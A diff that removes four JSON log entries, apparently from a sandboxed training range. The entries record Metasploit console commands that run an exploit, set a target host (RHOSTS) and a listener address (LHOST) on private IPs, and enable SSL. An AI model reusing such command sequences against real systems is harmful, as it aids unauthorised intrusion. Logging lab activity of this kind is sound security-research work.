@@ -1,4 +1,0 @@
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T17:02:27.686Z", "cmd_type": "msf-command", "cmd": "exploit"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T17:02:34.503Z", "cmd_type": "msf-command", "cmd": "set RHOSTS 10.1.26.9"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T17:02:37.149Z", "cmd_type": "msf-command", "cmd": "set LHOST 10.1.135.83"}
-{"sandbox_id": "3", "timestamp_str": "2021-07-12T17:02:40.122Z", "cmd_type": "msf-command", "cmd": "set SSL true"}
